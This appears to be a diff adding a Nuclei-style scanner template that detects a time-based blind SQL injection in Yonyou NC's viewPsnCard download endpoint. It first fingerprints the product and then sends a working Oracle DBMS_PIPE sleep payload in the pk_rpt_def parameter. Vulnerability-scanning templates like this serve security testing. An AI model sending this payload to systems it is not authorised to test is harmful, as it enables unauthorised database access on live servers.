@@ -1,0 +1,49 @@
+id: poc-yaml-yongyou-nc-viewpsncard-sqli
+
+info:
+  name: Yonyou NC viewPsnCard SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability found in Yonyou NC's viewPsnCard functionality. Exploiting this vulnerability could allow attackers to execute arbitrary SQL commands on the database.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Yonyou NC"
+        part: body
+
+  - raw:
+      - |
+        GET /portal/pt/viewPsnCard/download?pageId=login&pk_rpt_def=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',{{t1}})--&pk_psnjob=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
